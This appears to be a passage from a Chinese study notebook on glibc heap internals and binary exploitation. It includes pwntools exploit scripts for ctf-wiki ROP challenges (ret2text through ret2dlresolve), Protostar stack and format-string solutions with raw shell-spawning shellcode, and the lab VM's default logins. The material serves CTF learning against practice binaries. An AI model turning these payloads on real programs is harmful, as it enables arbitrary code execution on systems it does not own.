   Note: IS_MMAPPED is intentionally not masked off from size field in
   macros for which mmapped chunks should never be seen. This should
   cause helpful core dumps to occur if it is tried by accident by
   people extending or adapting this malloc.
 */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

/* Get size, ignoring use bits */
#define chunksize(p)         ((p)->size & ~(SIZE_BITS))
```

3. `malloc`是如何将申请的大小转化为实际分配的大小的呢？
   核心在于`request2size`宏：

```c
/* pad request bytes into a usable size -- internal version */

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
```

其中用到的其它宏定义：

```c
#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)

/* The corresponding bit mask value */
#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)

/* The smallest possible chunk */
#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))

/* The smallest size we can malloc is an aligned minimal chunk */
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
```

4. 这里还有一个`mem`指针，是做什么用的？
   这是调用`malloc`时返回给用户的指针。实际上，真正的chunk 是从`chunk`指针开始的。

```c
/* The corresponding word size */
#define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))

/* conversion from malloc headers to user pointers, and back */

#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
```

5. 用户申请的内存大小就是用户数据可用的内存大小吗？
   不一定，原因还是字节对齐问题。要获得可用内存大小，可以用`malloc_usable_size()`获得，其核心函数是：

```c
static size_t
musable (void *mem)
{
  mchunkptr p;
  if (mem != 0)
    {
      p = mem2chunk (mem);

      if (__builtin_expect (using_malloc_checking == 1, 0))
        return malloc_check_get_size (p);

      if (chunk_is_mmapped (p))
        return chunksize (p) - 2 * SIZE_SZ;
      else if (inuse (p))
        return chunksize (p) - SIZE_SZ;
    }
  return 0;
}
```

###### Free chunk

![](./Pwn/FreeChunk.png)

首先，`prev_size`必定存储上一个块的用户数据，因为 Free chunk 的上一个块必定是 Allocated chunk，否则会发生合并。
接着，多出来的`fd`指向同一个 bin 中的前一个 Free chunk，`bk`指向同一个 bin 中的后一个 Free chunk。
这里提到了 bin，我们将在后面介绍。
此外，对于 large bins 中的 Free chunk，`fd_nextsize`与`bk_nextsize`会生效，分别指向 large bins 中前一个（更大的）和后一个（更小的）空闲块。

###### Top chunk

一个`arena`顶部的 chunk 叫做 Top chunk，它不属于任何 bin。当所有 bin 中都没有空闲的可用 chunk 时，我们切割 Top chunk 来满足用户的内存申请。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为：

- 一个 K 字节的 chunk，分配给用户
- 一个 N-K 字节的 chunk，称为 Last Remainder chunk

后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么：

- 在`main_arena`中，用`brk()`扩张 Top chunk
- 在`non_main_arena`中，用`mmap()`分配新的堆

> 注：Top chunk 的 PREV_INUSE 位总是 1

###### Last Remainder chunk

当需要分配一个比较小的 K 字节的 chunk 但是 small bins 中找不到满足要求的，且 Last Remainder chunk 的大小 N 能满足要求，那么 Last Remainder chunk 将被切割为：

- 一个 K 字节的 chunk，分配给用户
- 一个 N-K 字节的 chunk，成为新的 Last Remainder chunk

它的存在使得连续的小空间内存申请，分配到的内存都是相邻的，从而达到了更好的局部性。

##### Bin 的结构

bin 是实现了空闲链表的数据结构，用来存储空闲 chunk，可分为：

- 10 个 fast bins，存储在`fastbinsY`中
- 1 个 unsorted bin，存储在`bin[1]`
- 62 个 small bins，存储在`bin[2]`至`bin[63]`
- 63 个 large bins，存储在`bin[64]`至`bin[126]`

还是一个一个来看。

###### fast bins

非常像高速缓存 cache，主要用于提高小内存分配效率。相邻空闲 chunk 不会被合并，这会导致外部碎片增多但是`free`效率提升。注意 fast bins 是 10 个 **LIFO 的单链表**。最后三个链表保留未使用。

chunk大小（含chunk头部）：0x10-0x40（64位0x20-0x80）B，相邻bin存放的大小相差0x8（0x10）B。

![fast bins](https://docs.google.com/drawings/d/144diIfbLqUmOPlAWbtP45mGsZlIl3PZWJvvH-cvQziU/pub?w=960&h=720)

> 注：加入 fast bins 的 chunk，它的`IN_USE`位（准确地说，是下一个 chunk 的`PREV_INUSE`位）依然是 1。这就是为什么相邻的“空闲”chunk 不会被合并，因为它们根本不会被认为是空闲的。

关于fastbin最大大小，参见宏`DEFAULT_MXFAST`：

```c
#ifndef DEFAULT_MXFAST
#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)
#endif
```

在初始化时，这个值会被赋值给全局变量`global_max_fast`。

申请fast chunk时遵循`first fit`原则。释放一个fast chunk时，首先检查它的大小以及对应fastbin此时的第一个chunk `old`的大小是否合法，随后它会被插入到对应fastbin的链表头，此时其`fd`指向`old`。

###### unsorted bin

非常像缓冲区 buffer，大小超过 fast bins 阈值的 chunk 被释放时会加入到这里，这使得 ptmalloc2 可以复用最近释放的 chunk，从而提升效率。

unsorted bin 是一个双向循环链表，chunk 大小：大于`global_max_fast`。
![unsorted bin](https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&h=865)

当程序申请大于`global_max_fast`内存时，分配器遍历unsorted bin，每次取最后的一个unsorted chunk。

1. 如果unsorted chunk满足以下四个条件，它就会被切割为一块满足申请大小的chunk和另一块剩下的chunk，前者返回给程序，后者重新回到unsorted bin。
   - 申请大小属于small bin范围
   - unosrted bin中只有该chunk
   - 这个chunk同样也是last remainder chunk
   - 切割之后的大小依然可以作为一个chunk

2. 否则，从unsorted bin中删除unsorted chunk。
   - 若unsorted chunk恰好和申请大小相同，则直接返回这个chunk
   - 若unsorted chunk属于small bin范围，插入到相应small bin
   - 若unsorted chunk属于large bin范围，则跳转到3。
3. 此时unsorted chunk属于large bin范围。
   - 若对应large bin为空，直接插入unsorted chunk，其`fd_nextsize`与`bk_nextsize`指向自身。
   - 否则，跳转到4。
4. 到这一步，我们需按大小降序插入对应large bin。
   - 若对应large bin最后一个chunk大于unsorted chunk，则插入到最后
   - 否则，从对应large bin第一个chunk开始，沿`fd_nextsize`（即变小）方向遍历，直到找到一个chunk `fwd`，其大小小于等于unsorted chunk的大小
     - 若`fwd`大小等于unsorted chunk大小，则插入到`fwd`后面
     - 否则，插入到`fwd`前面

直到找到满足要求的unsorted chunk，或无法找到，去top chunk切割为止。

###### small bins

小于 0x200（0x400）B 的 chunk 叫做 small chunk，而 small bins 可以存放的就是这些 small chunks。chunk 大小同样是从 16B 开始每次+8B。

small bins 是 62 个双向循环链表，并且是 FIFO 的，这点和 fast bins 相反。同样相反的是相邻的空闲 chunk 会被合并。

chunk大小：0x10-0x1f0B（0x20-0x3f0），相邻bin存放的大小相差0x8（0x10）B。

释放非fast chunk时，按以下步骤执行：

1. 若前一个相邻chunk空闲，则合并，触发对前一个相邻chunk的`unlink`操作
2. 若下一个相邻chunk是top chunk，则合并并结束；否则继续执行3
3. 若下一个相邻chunk空闲，则合并，触发对下一个相邻chunk的`unlink`操作；否则，设置下一个相邻chunk的`PREV_INUSE`为`0`
4. 将现在的chunk插入unsorted bin。
5. 若`size`超过了`FASTBIN_CONSOLIDATION_THRESHOLD`，则尽可能地合并fastbin中的chunk，放入unsorted bin。若top chunk大小超过了`mp_.trim_threshold`，则归还部分内存给OS。

```c
#ifndef DEFAULT_TRIM_THRESHOLD
#define DEFAULT_TRIM_THRESHOLD (128 * 1024)
#endif

#define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)
```

##### large bins

大于等于 0x200（0x400）B 的 chunk 叫做 large chunk，而 large bins 可以存放的就是这些 large chunks。

large bins 是 63 个双向循环链表，插入和删除可以发生在任意位置，相邻空闲 chunk 也会被合并。chunk 大小就比较复杂了：

- 前 32 个 bins：从 0x200B 开始每次+0x40B
- 接下来的 16 个 bins：每次+0x200B
- 接下来的 8 个 bins：每次+0x1000B
- 接下来的 4 个 bins：每次+0x8000B
- 接下来的 2 个 bins：每次+0x40000B
- 最后的 1 个 bin：只有一个 chunk，大小和 large bins 剩余的大小相同

注意同一个 bin 中的 chunks 不是相同大小的，按大小降序排列。这和上面的几种 bins 都不一样。而在取出chunk时，也遵循`best fit`原则，取出满足大小的最小chunk。

##### 内存分配流程

我觉得这类复杂的流程比较需要靠流程图来理解，因此我画了一下：

![Qdiypn.png](https://s2.ax1x.com/2019/12/08/Qdiypn.png)

相关宏：

```c
#define NBINS             128
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ)
#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)

#define in_smallbin_range(sz)  \
  ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE)

#ifndef DEFAULT_MMAP_THRESHOLD_MIN
#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)
#endif

#ifndef DEFAULT_MMAP_THRESHOLD
#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN
#endif
```

##### 内存释放流程

![3C7AKI.png](https://s2.ax1x.com/2020/02/17/3C7AKI.png)

##### 参考资料

- [Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)
- [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
- [Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)
- [glibc 内存管理 ptmalloc 源代码分析](https://paper.seebug.org/papers/Archive/refs/heap/glibc内存管理ptmalloc源代码分析.pdf)
- [Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)

## Wiki-CTF

https://github.com/ctf-wiki/ctf-wiki.git
终端中在自己需要的路径中输入 git clone https://github.com/ctf-wiki/ctf-wiki.git
注：Windows也可以安装git命令，但是要把git.exe以前的路径全部写入环境变量中(太简单了不写 自己搜)
下载之后进入目录打开README.md根据其中给出的命令进行部署，注：Windows不是python3而是python。

### Linux Platform

#### Exploitation

##### Stack Overflow

**基本ROP**

###### ret2text

```python
##!/usr/bin/env python
from pwn import *
sh = process('./ret2text')
target = 0x804863a #binsh地址
sh.sendline('A' * (0x6c+4) + p32(target)) #填满缓冲区空间再跳转到binsh的地址
sh.interactive()
```

###### ret2shellcode

```python
#!/usr/bin/env python
from pwn import *
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh()) #asm转为机器码
#shellcode表示一段shell代码，shellcraft.sh()表示利用Pwntools库中的shellcraft模块，生成一段能够弹出shell的代码
buf2_addr = 0x804a080
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
#ljust()函数表示在字符串左侧填充指定字符，以使字符串总长度为指定值，这里填充'a'字符，使字符串总长度为112
#ljust()函数实现左对齐，但是因为程序是小端序的，实际对其效果显示时在右边显示
sh.interactive()
```

###### ret2syscall

```python
#!/usr/bin/env python
from pwn import *
sh = process('./rop')
pop_eax_ret = 0x080bb196 #ROpgadget --binary rop --only 'pop|ret' | grep 'eax'
pop_edx_ecx_ebx_ret = 0x0806eb90 #ROpgadget --binary rop --only 'pop|ret' | grep 'ebx'
int_0x80 = 0x08049421 #ROpgadget --binary rop --only 'int'
binsh = 0x80be408 #ida反汇编shitf+f12找binsh地址 / ROpgadget --binary rop --string '/bin/sh'
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
#首先'a'*112填满缓冲区空间，然后用pop eax把0xb(11)号程序 即int80中断的第11号程序system()
#放入eax，将参数写入寄存器，最后调用int80中断来执行
#int80中断拿到0xb即11号程序，执行system()函数，ebx的binsh作为system函数的参数执行system(binsh)破解成功
sh.sendline(payload)
sh.interactive()
```

###### ret2libc1

```python
#!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1')
binsh_addr = 0x8048720 #shift+F12找到binsh双击进入找到.rodata段中的binsh地址
system_plt = 0x08048460 #ida反汇编进入后在.plt段中找到system 或从左侧函数栏中向右拉会有起始地址
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr]) 
#system函数需要一个返回地址作为参数 'b'*4为随便填充的地址 因为已经拿到binsh之后就不用在意system结束后跳到哪个地址
sh.sendline(payload)
sh.interactive()
```

###### ret2libc2

0xdeadbeef地址是一个特殊的值，在计算机程序中常用作“哨兵值”或“标志值”。哨兵值是一个特殊的值，用于在数据结构中表示“无效”、“结束”或“不存在”的数据。它通常用于数组、链表、哈希表等数据结构中，以便检测边界情况或错误情况。例如，在一个链表中，如果遍历到一个节点的“next”指针为0xdeadbeef，则表示已经到达链表的末尾。
0xdeadbeef的十六进制值为0xdeadbeef，即十进制的3735928559。这个值选择的原因是，它在内存中可以被轻松识别，并且很容易被人阅读和理解。在16进制下，它的每两位都代表一个字母，分别是d，e，a，d，b，e，e，f。可以看出，这个值具有很好的可读性和可记忆性，因此被广泛应用。

```python
##!/usr/bin/env python
from pwn import *
sh = process('./ret2libc2')
gets_plt = 0x08048460 #ida反汇编拿到get函数的指针地址
system_plt = 0x08048490 #同上
pop_ebx = 0x0804843d #ROPgadget --binary ret2libc2 --only 'pop|ret' | grep 'ebx'
buf2 = 0x804a080 #.bss段的最高位地址
payload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
#首先填满缓冲区，调用get函数，调用将数据推入ebx寄存器的指令，将buf2的地址推入ebx，然后调用system函数，0xdeadbeef占system函数返回地址，system函数获取get函数读取到指定buf2地址的数据作为参数来执行 然后输入binsh执行system('/bin/sh')
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

```python
from pwn import *
sh = process('./ret2libc2')
bss_addr = 0x0804A080 #bss段地址
system = 0x08048490 #system_plt
gets = 0x08048460 #gets_plt
payload = b'a'*112 + p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)
#gets_plt需要一个地址作为执行结束后的返回地址 而payload其后紧跟的system函数为其返回地址
#gets获取到输入之后输入的内容写入到bss段 gets_plt结束 返回到system函数
#因为system_plt也需要一个返回地址 所以第一个bss_addr为system函数执行完后的地址 并且也是gets函数写入的地址
#第二个bss_addr为system函数的参数 即gets函数输入/bin/sh后执行system('/bin/sh')拿到控制权
sh.sendlineafter('What do you think ?', payload)
sh.interactive()
```

###### ret2libc3

elf()函数是一个用来解析和处理可执行文件(executable and linkable format，ELF)的工具。它常常被用来解析ELF格式的二进制文件，从而获取这个文件中的重要信息，比如符号表、字符串表、动态链接符号和动态链接库的信息等。

没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址
获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址

总的来说：
1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）
2、将 puts 的返回地址设置为 \_start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system('/bin/sh')
3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址
4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell

```python
from pwn import *
sh = process('./ret2libc3') #本地连接
elf = ELF('./ret2libc3') #elf解析
libc = elf.libc #建立libc对象

puts_plt = elf.plt['puts'] #puts_plt地址
puts_got = elf.got['puts'] #puts_got地址
start_addr = elf.symbols['_start'] #start函数地址 程序入口
print "[*]puts plt: " + hex(puts_plt)
print "[*]puts got: " + hex(puts_got)
print "[*]_start addr: " + hex(start_addr)
print "[*]libc addr: " + hex(libc.address)
print "--" * 20
print "[*]sending payload1 to leak libc..."

payload = flat(["A" * 112, puts_plt, start_addr, puts_got]) 
#填充 溢出到puts_plt 程序结束后返回到start_addr 再次执行 puts函数参数为puts_got 该条payload泄露puts_got地址

sh.sendlineafter("Can you find it !?", payload)
puts_addr = u32(sh.recv(4)) #接收程序输出的puts_gots地址
print "[*]leak puts addr: " + hex(puts_addr)

libc.address = puts_addr - libc.symbols['puts'] #计算libc基地址 puts地址 - 函数中的puts地址
system_addr = libc.symbols['system']
binsh_addr = next(libc.search('/bin/sh')) #搜索/bin/sh
print "[*]leak libc addr: " + hex(libc.address)
print "[*]system addr: " + hex(system_addr)
print "[*]binsh addr: " + hex(binsh_addr)
print "--" * 20
print "[*]sending payload2 to getshell..."

payload2 = flat(["B" * 112, system_addr, "CCCC", binsh_addr])
sh.sendline(payload2)
sh.interactive()
```

###### ret2csu

与蒸米x64 level5相同

![](Pwn\ret2csu.png)

```python
from pwn import *
#context.log_level = 'debug'

level5 = ELF('./level5') #解析库文件
sh = process('./level5') #本地连通
libc = level5.libc #libc对象建立

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main'] #获取程序入口地址
bss_base = level5.bss() #bss地址
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc_base = write_addr - libc.symbols['write']
execve_addr = libc_base + libc.symbols['execve']
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```

###### ret2dlresolve

[[原创\]ROP高级用法之ret2_dl_runtime_resolve-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)](https://bbs.kanxue.com/thread-250703.htm)

`rop = ROP('./filename')` 还是要先创建一个对象
`rop.raw('a'*32)`  在构造的 rop 链里面写 32 个 a
`rop.call('read', (0, elf.bss(0x80)))` 调用一个函数，可以简写成：`rop.read(0, elf.bss(0x80))`
`rop.chain()`  就是整个 rop 链，发送的 payload
`rop.dump()` 直观地展示当前的 rop 链
`rop.migrate(base_stage)`  将程序流程转移到 base_stage（地址）
`rop.unresolve(value)` 给出一个地址，反解析出符号
`rop.search(regs=['ecx','ebx'])`  搜索对 eax 进行操作的 gadgets
`rop.find_gadget(['pop eax','ret'])`  搜索 pop eax ret 这样的 gadgets

程序源代码：

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

**NO RELRO**

```shell
❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO #没有开启只读保护！
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"
p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4) # modify .dynstr pointer in .dynamic section to a specific location
#源程序中调用了read函数，所以才可以直接使用read函数
#rop.read(0,0x08049804+4,4)是通过使用read函数来修改.dynstr指针在.dynamic节中的值，从而达到更改程序行为的目的。read函数的第一个参数为0，表示是标准输入。第二个参数为0x08049804+4，即.dynstr指针在内存中的地址。第三个参数为4，表示读取4个字节。
dynstr = elf.get_section_by_name('.dynstr').data() #获取.dynstr的整个数据
dynstr = dynstr.replace("read","system") #因为程序没有RELRO的只读保护 所以才可以直接更改符号表的函数名
#因为源程序中调用了read，所以才用system替换.dynstr的整个数据中的read，不能替换源程序中未调用的函数
rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section 构造一个假的dynstr节
#向内存地址 0x080498E0 中写入 dynstr 字符串的数据
rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256) #如果assert语句中的表达式为false，则会抛出AssertionError异常，并将程序停止
#该条代码检查生成的ROP链的长度是否小于等于256 因为在漏洞中只能向程序提供256个字节的输入 如果ROP链太长可能会发生栈溢出攻击失败
rop.raw("a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()
```

```python
from pwn import *
name = './main'
p = process(name)
elf= ELF(name)
bss_addr=elf.bss()

rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr   #0x8048330
dynsym_addr =  elf.get_section_by_name('.dynsym').header.sh_addr    #0x80481d8
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr     #0x8048278
resolve_plt = 0x08048380
leave_ret_addr = 0x8048458

start = 0x804a840
fake_rel_plt_addr = start
fake_dynsym_addr = fake_rel_plt_addr + 0x8
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh_addr = fake_dynstr_addr + 0x7
n = fake_rel_plt_addr - rel_plt_addr
r_info = (((fake_dynsym_addr - dynsym_addr)/0x10) << 8) + 0x7
str_offset = fake_dynstr_addr - dynstr_addr
fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)
fake_dynstr = "system\x00/bin/sh\x00\x00"
pay1 = 'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(pay1)
pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + 'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr
p.sendline(pay2)
#########
success(".rel_plt: " + hex(rel_plt_addr))
success(".dynsym: " + hex(dynsym_addr))
success(".dynstr: " + hex(dynstr_addr))
success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))
success("fake_dynsym_addr: " + hex(fake_dynsym_addr))
success("fake_dynstr_addr: " + hex(fake_dynstr_addr))
success("n: " + hex(n))
success("r_info: " + hex(r_info))
success("offset: " + hex(str_offset))
success("system_addr: " + hex(fake_dynstr_addr))
success("bss_addr: " + hex(elf.bss()))
p.interactive()
```

## Protostar

[芥燃斯基的个人空间_哔哩哔哩_bilibili](https://space.bilibili.com/479430036/)
Protostar官网地址：https://exploit.education/protostar/ 含题目源码
https://github.com/ExploitEducation/Protostar/releases/download/v2.0.0/exploit-exercises-protostar-2.iso

```
user:user
root:godmode

Getting started
Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
The levels to be exploited can be found in the /opt/protostar/bin directory.
For debugging the final levels, you can log in as root with password “godmode”
```

注：虚拟机为32位Debian系统 题目路径为/opt/protostar/bin 程序源代码此处不写 网站上有

### Ubuntu ssh Protostar

#### Method

```shell
ssh user@ipAddress #如果不能直接ssh连接上再参考如下内容
```

#### Scheme

```shell
cd root
cd ~
apt install ssh
cd .ssh
vim config
```

```config
Host *
		HostkeyAlgorithms +ssh-rsa
		PubkeyAcceptedKeyTypes +ssh-rsa
```

```shell
scp -r user@192.168.44.149:/opt/protostar/bin ./Protostar/ #该命令可以直接从对端机器拷贝pwn文件到本机
```

或者直接删除/root/.ssh目录下known_hosts文件(我用该方法成功了)

### Stack Overflow

#### stack1

so fucking ez

#### stack2

```python
#variable = getenv("GREENIE"); //获取一个名为"GREENIE"环境变量的内容
#vim stack2.py
buffer = "a"*64
mod = "\x0a\x0d\x0a\x0d" #机器码小端序反写
new_env = buffer + mod
print new_env
```

```shell
#注！shell编程中等号左右不能有空格！~
export GREENIE=`python stack2.py` #将攻击脚本的值写入环境变量中 读取环境变量后造成溢出并修改modified数据为0x0d0a0d0a
#或使用如下命令
export GREENIE=`python -c 'print "B"*64 + "\x0a\x0d\x0a\x0d"'`
```

```shell
root@protostar:/opt/protostar/bin# export GREENIE=`python stack2.py`
root@protostar:/opt/protostar/bin# ./stack2
you have correctly modified the variable
```

#### stack3

```shell
objdump -d -M intel stack3 #寻找win函数地址 拿到8048424
```

```python
payload = "B"*64 + "\x24\x84\x04\x08"
```

#### stack4

```shell
objdump -d -M intel stack3 #寻找win函数地址 拿到080483f4
```

```python
payload = "B"*76 + "\xf4\x83\x04\x08" #用二叉方法手测溢出大小 系统没有pwn环境不太方便 
```

#### stack5

```python
#stack5.py
ret = \xc0\xfc\xff\xbf #0xbffffcc0
shellcode=\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
payload = "B"*76 + ret + shellcode
```

```shell
(python stack5.py; cat) | /opt/protostar/bin/stack5
```

#### stack6

强烈建议看原视频：[【无痛入门PWN系列】【Protostar】10. stack6 题解(第一个ret2libc)_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Y14y1u7HC/?spm_id_from=333.999.0.0&vd_source=2474c2089bb9a19ecff81199bd7f94eb)

\_\_builtin\_xxx函数叫做内建函数，即编译器内部实现的函数。\_\_builtin\_return\_address(0)的语义是“返回当前函数的返回地址”，即，getpath()的返回地址。
\_\_builtin\_return\_address(0) 返回当前函数的返回地址
\_\_builtin\_return\_address(1) 返回当前函数的调用函数的返回地址
\_\_builtin\_return\_address(2) 返回当前函数的调用函数的调用函数的返回地址

```shell
(gdb) info proc map #程序内存信息 查看stack
```

1.在程序代码中找到可重复的攻击代码

```python
buffer = ""
for i in range(0x41, 0x55):
    buffer += chr(i)*4
    
ret = "\xf9\x84\x04\x08" #0x080484f9

ret += "\xb4\xfc\xff\xbf" #0xbffffcac+8=0xbfff fcb4

payload = "\xcc"*8
padding = buffer + ret + payload
f = open('exp6.txt', 'w')
f.write(padding)
f.close()
```

2.在Libc空间中找到可复用的攻击代码(ret2libc)

```shell
ldd stack6 #查看文件用的库为/libc/libc.so.6
strings -t d /lib/libc.so.6 | grep "/bin/sh" #1176511 /bin/sh

(gdb) b *0x080484f9 #在getpath的ret处断点
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
(gdb) r < exp6.txt #溢出
Starting program: /opt/protostar/bin/stack6 < exp6.txt
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPRRRRSSSSTTTT▒

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) print system #断点后输出libc的system地址
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

```python
import struct
buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPRRRRSSSSTTTT"
system = struct.pack("I", 0xb7ecffb0)
sys_ret = "AAAA"
binsh = struct.pack("I", 0xb7e97000 + 1176511)
padding = buffer + system + sys_ret + binsh
print padding
```

```
(python exp.py; cat) | /opt/protostar/bin/stack6
```

### Format String

#### Format0

这道题跟格式化字符串关系不大
下面exp会给出两个，其中一个会使用格式化字符串的方法

sprintf() Example：

```c
//int sprintf(char * str, const char * format, ...)
/* sprintf example */
#include <stdio.h>
int main()
{
    char buffer [50];
    int n, a=5, b=3;
    n = sprintf (buffer, "%d plus %d is %d", a, b, a+b);
    printf ("[%s] is a string %d chars long\n", buffer, n);
    return 0;
}
//Output:
//[5 plus 3 is 8] is a string 13 chars long
```

![image-20230307102603754](./Pwn/Protostar_format0_show.png)

如图所示栈顶存储着两个指针，这两个指针指向存储sprintf参数的存储空间，所以数据可以直接通过该指针写入对应的位置。

```python
#溢出方法写入
buffer = "A"*64 #junk
target = "\xef\xbe\xad\xde" #0xdeadbeef
print buffer + target
```

```python
#格式化方法写入
buffer = "%64c" #第64个参数后写入字符串
target = "\xef\xbe\xad\xde" #0xdeadbeef
print buffer + target
```

```python
root@protostar:/opt/protostar/bin# vim f0.py
root@protostar:/opt/protostar/bin# python f0.py > f0.txt
root@protostar:/opt/protostar/bin# ./format0 `cat f0.txt`
```

#### Format1

```c
#include <stdlib.h>
